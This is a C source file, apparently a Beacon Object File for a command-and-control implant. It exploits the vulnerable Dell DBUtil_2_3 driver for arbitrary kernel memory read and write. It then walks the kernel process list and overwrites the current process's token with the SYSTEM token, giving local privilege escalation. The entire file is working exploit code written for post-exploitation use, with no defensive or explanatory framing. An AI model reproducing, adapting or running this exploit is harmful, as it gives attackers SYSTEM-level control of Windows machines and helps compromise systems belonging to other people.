#include <windows.h>
#include "beacon.h"
#include <stdio.h>
#include <psapi.h>
#include <stdint.h>
#include "offsets.h"

//#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

typedef enum _SYSTEM_INFORMATION_CLASS {   
  SystemBasicInformation = 0,
  SystemProcessorInformation = 1,
  SystemPerformanceInformation = 2,                      
  SystemTimeOfDayInformation = 3,
  SystemProcessInformation = 5,              
  SystemProcessorPerformanceInformation = 8,
  SystemHandleInformation = 0x10,
  SystemPagefileInformation = 18,
  SystemInterruptInformation = 23,
  SystemExceptionInformation = 33,
  SystemRegistryQuotaInformation = 37,                       
  SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* fNtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID                    SystemInformation,
        ULONG                    SystemInformationLength,
        PULONG                   ReturnLength
        );

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

struct DellBuff {
	ULONGLONG pad1;
	ULONGLONG Address;
	ULONGLONG three1;
	ULONGLONG value;
} DellBuff;

typedef ULONGLONG QWORD;
typedef union {
	struct
	{
		char Protection;
		uint8_t padding[7];
	};
	QWORD qword;
} ProtectionQword;



HANDLE hDriver = INVALID_HANDLE_VALUE;

DECLSPEC_IMPORT FARPROC KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HMODULE KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT NTSTATUS NTDLL$NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT BOOL ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT HANDLE KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();
DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT HLOCAL KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT PDWORD ADVAPI32$GetSidSubAuthority(PSID, DWORD);
DECLSPEC_IMPORT PUCHAR ADVAPI32$GetSidSubAuthorityCount(PSID);
DECLSPEC_IMPORT HLOCAL KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT BOOL KERNEL32$K32EnumDeviceDrivers(LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL KERNEL32$GlobalMemoryStatusEx(LPMEMORYSTATUSEX);
DECLSPEC_IMPORT DWORD KERNEL32$GetCurrentProcessId();

BOOL RequirePrivilege(LPCTSTR lpPrivilege) {
        HANDLE hToken = NULL;
        BOOL bResult = FALSE;
        TOKEN_PRIVILEGES tp = { 0 };
        LUID luid = { 0 };

        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to open process token\n");
			goto _END_OF_FUNC;
        }

        if (!ADVAPI32$LookupPrivilegeValueA(NULL, lpPrivilege, &luid)) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to lookup priv name\n");
                goto _END_OF_FUNC;
        }

        tp.PrivilegeCount = 1; // only adjust one privilege
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        bResult = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        // check GetLastError() to check if privilege has been changed
        if (KERNEL32$GetLastError() != ERROR_SUCCESS) {
                BeaconPrintf( CALLBACK_ERROR, "AdjustTokenPriv failed with error: %d\n", KERNEL32$GetLastError());
                goto _END_OF_FUNC;
        }
        bResult = TRUE;
		BeaconPrintf(CALLBACK_OUTPUT, "LGTM\n");

_END_OF_FUNC:
        if (hToken)
                KERNEL32$CloseHandle(hToken);
        return bResult;
}

QWORD get_systemeproc() {
        ULONG returnLenght = 0;
        fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("NTDLL"), "NtQuerySystemInformation");
        PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
        NTDLL$NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[0];
        return (QWORD)handleInfo.Object;
}


DWORD64 DellRead(VOID* Address) {
	struct DellBuff ReadBuff = {0};
	ReadBuff.Address = (DWORD64)Address;
	DWORD BytesRead = 0;
	BOOL success = KERNEL32$DeviceIoControl(hDriver, 0x9B0C1EC4, &ReadBuff, sizeof(ReadBuff), &ReadBuff, sizeof(ReadBuff), &BytesRead, NULL);
	if (!success) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Memory read failed. 2\n");
		KERNEL32$CloseHandle(hDriver);
	}

	return ReadBuff.value;
}


VOID DellWrite(VOID* Address, LONGLONG value) {
	struct DellBuff WriteBuff = {0};
	WriteBuff.Address = (DWORD64)Address;
	WriteBuff.value = value;
	DWORD BytesRead = 0;
	BOOL success = KERNEL32$DeviceIoControl(hDriver, 0x9B0C1EC8, &WriteBuff, sizeof(WriteBuff), &WriteBuff, sizeof(WriteBuff), &BytesRead, NULL);
	if (!success) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Memory read failed. 2\n");
		KERNEL32$CloseHandle(hDriver);
	}
}



void go(int arc, char* argv[]) {

	int result = RequirePrivilege(TEXT("SeDebugPrivilege"));
	if (result != 1) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Priv failed with error %d\n", result);
		return;
	}

	hDriver = KERNEL32$CreateFileA("\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	QWORD system_eproc = get_systemeproc();
	if (system_eproc == 0) {
		return;
	}
	QWORD system_token = DellRead(system_eproc + (QWORD)_EPROCESS_Token);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] System eproc value: 0x%llx\n", system_eproc);
	QWORD current_eproc = system_eproc;
	DWORD program_pid = KERNEL32$GetCurrentProcessId();

	DWORD current_pid = 0;

	while (TRUE) {
		current_eproc = DellRead(current_eproc + (QWORD)_EPROCESS_ActiveProcessLinks);
		current_eproc -= _EPROCESS_ActiveProcessLinks;

		current_pid = DellRead(current_eproc + _EPROCESS_UniqueProcessId);
		if (current_pid == program_pid) {
			BeaconPrintf(CALLBACK_OUTPUT, "\t[+] Replacing token");
			DellWrite(current_eproc + (QWORD)_EPROCESS_Token, system_token);

			break; // use the current_eproc value
		}
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Demon should be running as system now");

	return;
}


